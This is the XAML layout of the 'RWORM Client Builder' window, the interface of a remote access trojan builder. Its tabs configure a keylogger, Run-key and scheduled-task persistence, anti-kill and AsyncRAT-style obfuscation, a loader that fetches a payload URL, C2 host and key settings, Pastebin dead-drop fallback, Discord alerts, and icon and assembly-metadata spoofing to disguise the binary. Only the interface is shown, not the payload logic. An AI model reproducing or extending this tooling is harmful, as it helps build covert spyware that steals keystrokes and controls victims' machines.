<Window x:Class="RWORM.GUI.Views.BuilderWindow"
        xmlns:conv="clr-namespace:RWORM.GUI.Converters"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="RWORM — Client Builder"
        Height="620" Width="860"
        MinHeight="540" MinWidth="740"
        WindowStartupLocation="CenterScreen"
        Background="#141414" Foreground="#F5F5F5">

    <Window.Resources>
        <conv:InverseBoolConverter x:Key="InverseBoolConverter"/>

        <!-- Tab Button Style -->
        <Style x:Key="TabNavButton" TargetType="RadioButton">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="#8A8A8A"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Padding" Value="18,12"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="RadioButton">
                        <Border x:Name="TabBorder" Background="{TemplateBinding Background}"
                                BorderBrush="Transparent" BorderThickness="0,0,0,2"
                                Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter Property="Foreground" Value="#F5F5F5"/>
                                <Setter TargetName="TabBorder" Property="Background" Value="#262626"/>
                            </Trigger>
                            <Trigger Property="IsChecked" Value="True">
                                <Setter Property="Foreground" Value="#F87171"/>
                                <Setter TargetName="TabBorder" Property="BorderBrush" Value="#DC2626"/>
                                <Setter TargetName="TabBorder" Property="Background" Value="#450A0A"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- Card Style -->
        <Style x:Key="LightCard" TargetType="Border">
            <Setter Property="Background" Value="#1A1A1A"/>
            <Setter Property="BorderBrush" Value="#2E2E2E"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="CornerRadius" Value="8"/>
            <Setter Property="Padding" Value="18"/>
            <Setter Property="Margin" Value="0,0,0,14"/>
        </Style>

        <!-- Light TextBox -->
        <Style x:Key="LightTextBox" TargetType="TextBox">
            <Setter Property="Background" Value="#1A1A1A"/>
            <Setter Property="Foreground" Value="#F5F5F5"/>
            <Setter Property="CaretBrush" Value="#F5F5F5"/>
            <Setter Property="BorderBrush" Value="#3A3A3A"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Padding" Value="10,0"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="VerticalContentAlignment" Value="Center"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="TextBox">
                        <Border Background="{TemplateBinding Background}"
                                BorderBrush="{TemplateBinding BorderBrush}"
                                BorderThickness="{TemplateBinding BorderThickness}"
                                CornerRadius="6"
                                Padding="{TemplateBinding Padding}">
                            <ScrollViewer x:Name="PART_ContentHost"
                                          Focusable="False"
                                          HorizontalScrollBarVisibility="Hidden"
                                          VerticalScrollBarVisibility="Disabled"
                                          VerticalAlignment="Center"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- Light CheckBox -->
        <Style x:Key="LightCheckBox" TargetType="CheckBox" BasedOn="{StaticResource {x:Type CheckBox}}">
            <Setter Property="Foreground" Value="#F5F5F5"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="Margin" Value="0,0,0,8"/>
            <Setter Property="Cursor" Value="Hand"/>
        </Style>
    </Window.Resources>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="54"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="50"/>
        </Grid.RowDefinitions>

        <!-- Header / Tab Bar -->
        <Border Grid.Row="0" Background="#1A1A1A" BorderBrush="#2E2E2E" BorderThickness="0,0,0,1">
            <Grid Margin="18,0">
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <StackPanel Orientation="Horizontal" Margin="0,0,24,0" VerticalAlignment="Center">
                        <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="26" Height="26" Margin="0,0,8,0" VerticalAlignment="Center"/>
                        <TextBlock Text="RWORM BUILDER" FontSize="14" FontWeight="Bold" Foreground="#F5F5F5" VerticalAlignment="Center"/>
                    </StackPanel>

                    <RadioButton x:Name="TabSurveillance" Style="{StaticResource TabNavButton}" Content="SURVEILLANCE"
                                 GroupName="BuilderTabs" IsChecked="True" Click="Tab_Click" Tag="0"/>
                    <RadioButton x:Name="TabListener" Style="{StaticResource TabNavButton}" Content="LISTENER"
                                 GroupName="BuilderTabs" Click="Tab_Click" Tag="1"/>
                    <RadioButton x:Name="TabAssembly" Style="{StaticResource TabNavButton}" Content="ASSEMBLY &amp; CLONING"
                                 GroupName="BuilderTabs" Click="Tab_Click" Tag="2"/>
                    <RadioButton x:Name="TabBuild" Style="{StaticResource TabNavButton}" Content="BUILD"
                                 GroupName="BuilderTabs" Click="Tab_Click" Tag="3"/>
                </StackPanel>
            </Grid>
        </Border>

        <!-- Tab Contents -->
        <TabControl x:Name="TabPages" Grid.Row="1" Background="Transparent" BorderThickness="0" Padding="20">
            <TabControl.ItemContainerStyle>
                <Style TargetType="TabItem">
                    <Setter Property="Visibility" Value="Collapsed"/>
                </Style>
            </TabControl.ItemContainerStyle>

            <!-- ── TAB 1: SURVEILLANCE ──────────────────────────────────────── -->
            <TabItem>
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                        <TextBlock Text="Surveillance &amp; Evasion Settings" FontSize="18" FontWeight="SemiBold"
                                   Foreground="#F5F5F5" Margin="0,0,0,16"/>

                        <!-- Evasion & Security -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <TextBlock Text="Defense &amp; Alerts" FontSize="14" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,12"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Kill (Embedded explorer.exe supervisor &amp; anti-termination)"
                                          IsChecked="{Binding BuildAntiKill}"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Obfuscator (AsyncRAT dnlib identifier, class &amp; symbol renaming)"
                                          IsChecked="{Binding BuildObfuscator}"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Sandbox / Anti-VM (Maintenance / Disabled)"
                                          IsChecked="False" IsEnabled="False" Opacity="0.6"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Discord Webhook Alert (Notify on client connection)"
                                          IsChecked="{Binding BuildDiscordAlert}" Margin="0,6,0,6"/>
                                <Grid Margin="24,0,0,4" IsEnabled="{Binding BuildDiscordAlert}">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="Auto"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="Webhook URL:" FontSize="12" Foreground="#A0A0A0" VerticalAlignment="Center" Margin="0,0,10,0"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="34"
                                             Text="{Binding BuildDiscordWebhook, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                            </StackPanel>
                        </Border>

                        <!-- Persistence Settings -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <TextBlock Text="Persistence Settings" FontSize="14" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,12"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Startup Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)"
                                          IsChecked="{Binding BuildStartupRegistry}"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Scheduled Tasks (SCH TASKS — Auto-restart on user logon)"
                                          IsChecked="{Binding BuildSchTasks}"/>
                                <StackPanel Orientation="Horizontal" Margin="0,6,0,0">
                                    <TextBlock Text="Installation / Startup Path:" FontSize="12" Foreground="#A0A0A0" VerticalAlignment="Center" Margin="0,0,12,0"/>
                                    <TextBox Style="{StaticResource LightTextBox}" Width="320" Height="34"
                                             Text="{Binding BuildStartupPath, UpdateSourceTrigger=PropertyChanged}"/>
                                </StackPanel>
                            </StackPanel>
                        </Border>

                        <!-- Surveillance / Keylogger / Loader -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <TextBlock Text="Monitoring &amp; Tasks" FontSize="14" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,12"/>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Keylogger"
                                          IsChecked="{Binding BuildKeyloggerEnabled}"/>
                                <StackPanel Orientation="Horizontal" Margin="24,0,0,12" IsEnabled="{Binding BuildKeyloggerEnabled}">
                                    <RadioButton Content="Offline (log to file until retrieved)"
                                                 IsChecked="{Binding BuildKeyloggerOnline, Converter={StaticResource InverseBoolConverter}, Mode=TwoWay}"
                                                 Foreground="#A0A0A0" Margin="0,0,16,0"/>
                                    <RadioButton Content="Online (stream live)"
                                                 IsChecked="{Binding BuildKeyloggerOnline}"
                                                 Foreground="#A0A0A0"/>
                                </StackPanel>

                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Loader Task on Connect"
                                          IsChecked="{Binding BuildTaskEnabled}" Margin="0,6,0,6"/>
                                <Grid Margin="24,0,0,0" IsEnabled="{Binding BuildTaskEnabled}">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="Auto"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="Payload URL:" FontSize="12" Foreground="#A0A0A0" VerticalAlignment="Center" Margin="0,0,10,0"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="34"
                                             Text="{Binding BuildTaskUrl, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                </ScrollViewer>
            </TabItem>

            <!-- ── TAB 2: LISTENER ─────────────────────────────────────────── -->
            <TabItem>
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                        <TextBlock Text="Listener &amp; Connection Settings" FontSize="18" FontWeight="SemiBold"
                                   Foreground="#F5F5F5" Margin="0,0,0,4"/>
                        <TextBlock Text="Configure C2 connection parameters and dynamic host resolution."
                                   FontSize="12" Foreground="#8A8A8A" Margin="0,0,0,16"/>

                        <!-- Primary Connection -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <TextBlock Text="Primary C2 Server" FontSize="14" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,12"/>
                                <Grid Margin="0,0,0,12">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="150"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="C2 Host / IP:" FontSize="13" FontWeight="SemiBold" Foreground="#F5F5F5" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildHost, UpdateSourceTrigger=PropertyChanged}"
                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
                                             FontWeight="SemiBold"
                                             FontSize="13"/>
                                </Grid>

                                <Grid Margin="0,0,0,12">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="150"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="C2 Port:" FontSize="13" FontWeight="SemiBold" Foreground="#F5F5F5" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildPort, UpdateSourceTrigger=PropertyChanged}"
                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
                                             FontWeight="SemiBold"
                                             FontSize="13"/>
                                </Grid>

                                <Grid Margin="0,0,0,12">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="150"/>
                                        <ColumnDefinition Width="*"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="Group Tag:" FontSize="13" FontWeight="SemiBold" Foreground="#F5F5F5" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildGroupTag, UpdateSourceTrigger=PropertyChanged}"
                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
                                             FontWeight="SemiBold"
                                             FontSize="13"
                                             ToolTip="Label baked into the binary — identifies which campaign/batch this build belongs to."/>
                                </Grid>

                                <Grid Margin="0,0,0,4">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="150"/>
                                        <ColumnDefinition Width="*"/>
                                        <ColumnDefinition Width="Auto"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Text="Encryption Key:" FontSize="13" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildEncryptionKey, UpdateSourceTrigger=PropertyChanged}"
                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
                                             FontWeight="SemiBold"
                                             FontSize="13"/>
                                    <Button Grid.Column="2" Content="Generate Key" Command="{Binding GenerateKeyCommand}"
                                            Background="#DC2626" Foreground="White" BorderThickness="0"
                                            Padding="14,0" Height="36" Margin="10,0,0,0" FontWeight="SemiBold" Cursor="Hand">
                                        <Button.Template>
                                            <ControlTemplate TargetType="Button">
                                                <Border Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                                                    <ContentPresenter VerticalAlignment="Center" HorizontalAlignment="Center"/>
                                                </Border>
                                            </ControlTemplate>
                                        </Button.Template>
                                    </Button>
                                </Grid>
                                <TextBlock Text="Standard AES-256 encrypted tunnel active by default"
                                           FontSize="11" Foreground="#8A8A8A" Margin="150,4,0,0"/>
                            </StackPanel>
                        </Border>

                        <!-- Dynamic Pastebin Host Resolution -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Dynamic Resolution (Pastebin Raw)"
                                          IsChecked="{Binding BuildPastebinEnabled}" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,8"/>
                                <TextBlock Text="Get IP / Port from Pastebin raw URL (Dynamic C2 fallback):" FontSize="12" Foreground="#A0A0A0" Margin="0,0,0,8"/>
                                <Grid IsEnabled="{Binding BuildPastebinEnabled}">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="*"/>
                                        <ColumnDefinition Width="Auto"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBox Grid.Column="0" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildPastebinRaw, UpdateSourceTrigger=PropertyChanged}"
                                             FontFamily="Cascadia Code, Consolas, Segoe UI"
                                             ToolTip="Example: https://pastebin.com/raw/xxxxxx"/>
                                    <Button Grid.Column="1" Content="Test Raw URL" Command="{Binding TestPastebinCommand}"
                                            Background="#059669" Foreground="White" BorderThickness="0"
                                            Padding="14,0" Height="36" Margin="10,0,0,0" FontWeight="SemiBold" Cursor="Hand">
                                        <Button.Template>
                                            <ControlTemplate TargetType="Button">
                                                <Border Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                                                    <ContentPresenter VerticalAlignment="Center" HorizontalAlignment="Center"/>
                                                </Border>
                                            </ControlTemplate>
                                        </Button.Template>
                                    </Button>
                                </Grid>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                </ScrollViewer>
            </TabItem>

            <!-- ── TAB 3: ASSEMBLY ─────────────────────────────────────────── -->
            <TabItem>
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                        <TextBlock Text="Client Assembly &amp; Icon" FontSize="18" FontWeight="SemiBold"
                                   Foreground="#F5F5F5" Margin="0,0,0,16"/>

                        <!-- Icon Selection Card -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Custom Client Icon (.ico)"
                                          IsChecked="{Binding BuildIconEnabled}" FontWeight="SemiBold" Foreground="#F87171" Margin="0,0,0,10"/>
                                <Grid IsEnabled="{Binding BuildIconEnabled}">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="*"/>
                                        <ColumnDefinition Width="Auto"/>
                                    </Grid.ColumnDefinitions>
                                    <TextBox Grid.Column="0" Style="{StaticResource LightTextBox}" Height="36"
                                             Text="{Binding BuildIconPath, UpdateSourceTrigger=PropertyChanged}"
                                             ToolTip="Optional icon path (.ico)"/>
                                    <Button Grid.Column="1" Content="Select .ico File" Command="{Binding SelectIconCommand}"
                                            Background="#DC2626" Foreground="White" BorderThickness="0"
                                            Padding="14,0" Height="36" Margin="10,0,0,0" FontWeight="SemiBold" Cursor="Hand">
                                        <Button.Template>
                                            <ControlTemplate TargetType="Button">
                                                <Border Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                                                    <ContentPresenter VerticalAlignment="Center" HorizontalAlignment="Center"/>
                                                </Border>
                                            </ControlTemplate>
                                        </Button.Template>
                                    </Button>
                                </Grid>
                                <TextBlock Text="Leave unchecked or unselected to compile without custom application icon."
                                           FontSize="11" Foreground="#8A8A8A" Margin="0,6,0,0"/>
                            </StackPanel>
                        </Border>

                        <!-- Assembly Clone & Metadata Card -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <DockPanel Margin="0,0,0,12">
                                    <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Custom Assembly Spoofing"
                                              IsChecked="{Binding BuildAssemblyEnabled}" FontWeight="SemiBold" Foreground="#F87171" VerticalAlignment="Center"/>
                                    <Button DockPanel.Dock="Right" Content="Clone Assembly from File" Command="{Binding CloneAssemblyCommand}"
                                            Background="#059669" Foreground="White" BorderThickness="0"
                                            Padding="14,0" Height="32" FontWeight="SemiBold" Cursor="Hand">
                                        <Button.Template>
                                            <ControlTemplate TargetType="Button">
                                                <Border Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                                                    <ContentPresenter VerticalAlignment="Center" HorizontalAlignment="Center"/>
                                                </Border>
                                            </ControlTemplate>
                                        </Button.Template>
                                    </Button>
                                </DockPanel>

                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="File Title:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyTitle, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Description:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyDescription, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Company:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyCompany, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Product:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyProduct, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Copyright:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyCopyright, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                                <Grid Margin="0,0,0,10" IsEnabled="{Binding BuildAssemblyEnabled}">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="140"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Version:" Foreground="#A0A0A0" VerticalAlignment="Center"/>
                                    <TextBox Grid.Column="1" Style="{StaticResource LightTextBox}" Text="{Binding BuildAssemblyVersion, UpdateSourceTrigger=PropertyChanged}"/>
                                </Grid>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                </ScrollViewer>
            </TabItem>

            <!-- ── TAB 4: BUILD ────────────────────────────────────────────── -->
            <TabItem>
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel MaxWidth="780" HorizontalAlignment="Left">
                        <TextBlock Text="Last Build Config" FontSize="18" FontWeight="SemiBold"
                                   Foreground="#F5F5F5" Margin="0,0,0,16"/>

                        <!-- Active Settings Card -->
                        <Border Style="{StaticResource LightCard}">
                            <StackPanel>
                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Target Endpoint:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Foreground="#F5F5F5" FontWeight="Bold" FontFamily="Cascadia Code, Consolas, Segoe UI">
                                        <TextBlock.Text>
                                            <MultiBinding StringFormat="{}{0}:{1}">
                                                <Binding Path="BuildHost"/>
                                                <Binding Path="BuildPort"/>
                                            </MultiBinding>
                                        </TextBlock.Text>
                                    </TextBlock>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Pastebin Fallback:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildPastebinRaw, FallbackValue='(Not configured)'}" Foreground="#F5F5F5"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Binary Packaging:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="Self-Contained &amp; IL-Trimmed (Single File ~11 MB)" Foreground="#F87171" FontWeight="SemiBold"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Anti-Kill Protection:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildAntiKill, StringFormat='Active: {0}'}" Foreground="#F5F5F5" FontWeight="SemiBold"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="AsyncRAT Obfuscator:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildObfuscator, StringFormat='Active: {0}'}" Foreground="#F87171" FontWeight="SemiBold"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="AsyncRAT Obfuscator:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildObfuscator, StringFormat='Active: {0}'}" Foreground="#F87171" FontWeight="SemiBold"/>
                                </Grid>

                                

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Assembly Spoofing:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildAssemblyEnabled, StringFormat='Enabled: {0}'}" Foreground="#F87171"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Custom Icon:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildIconEnabled, StringFormat='Enabled: {0}'}" Foreground="#F87171"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Discord Alert:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildDiscordAlert, StringFormat='Active: {0}'}" Foreground="#F5F5F5"/>
                                </Grid>

                                <Grid Margin="0,0,0,8">
                                    <Grid.ColumnDefinitions><ColumnDefinition Width="160"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                    <TextBlock Text="Keylogger Module:" Foreground="#8A8A8A"/>
                                    <TextBlock Grid.Column="1" Text="{Binding BuildKeyloggerEnabled, StringFormat='Enabled: {0}'}" Foreground="#F5F5F5"/>
                                </Grid>
                            </StackPanel>
                        </Border>

                        <!-- Build Execution Card -->
                        <Border Style="{StaticResource LightCard}" Background="#052E16" BorderBrush="#166534">
                            <Grid>
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="Auto"/>
                                </Grid.ColumnDefinitions>

                                <StackPanel VerticalAlignment="Center">
                                    <TextBlock Text="Ready to compile client payload." FontSize="14" FontWeight="SemiBold" Foreground="#F5F5F5"/>
                                    <TextBlock Text="Compiled binary will be packaged as a standalone executable." FontSize="12" Foreground="#A0A0A0" Margin="0,4,0,0"/>
                                    <TextBlock Text="{Binding StatusMessage}" FontSize="12" Foreground="#F87171" FontWeight="SemiBold" Margin="0,8,0,0"/>
                                </StackPanel>

                                <Button Grid.Column="1"
                                        Command="{Binding BuildCommand}"
                                        Background="#16A34A" Foreground="White"
                                        FontSize="14" FontWeight="Bold"
                                        Height="48" Width="220" Cursor="Hand" Margin="16,0,0,0">
                                    <Button.Template>
                                        <ControlTemplate TargetType="Button">
                                            <Border Background="{TemplateBinding Background}" CornerRadius="8">
                                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" VerticalAlignment="Center">
                                                    <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="26" Height="26" Margin="0,0,10,0" VerticalAlignment="Center"/>
                                                    <TextBlock Text="BUILD CLIENT" FontSize="14" FontWeight="Bold" Foreground="White" VerticalAlignment="Center"/>
                                                </StackPanel>
                                            </Border>
                                            <ControlTemplate.Triggers>
                                                <Trigger Property="IsMouseOver" Value="True">
                                                    <Setter Property="Background" Value="#15803D"/>
                                                </Trigger>
                                            </ControlTemplate.Triggers>
                                        </ControlTemplate>
                                    </Button.Template>
                                </Button>
                            </Grid>
                        </Border>
                    </StackPanel>
                </ScrollViewer>
            </TabItem>
        </TabControl>

        <!-- Status Bar -->
        <Border Grid.Row="2" Background="#1A1A1A" BorderBrush="#2E2E2E" BorderThickness="0,1,0,0">
            <Grid Margin="18,0">
                
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                    <TextBlock Text="Payload: Windows x64 (~11 MB)" FontSize="12" Foreground="#8A8A8A"/>
                </StackPanel>
            </Grid>
        </Border>
    </Grid>
</Window>
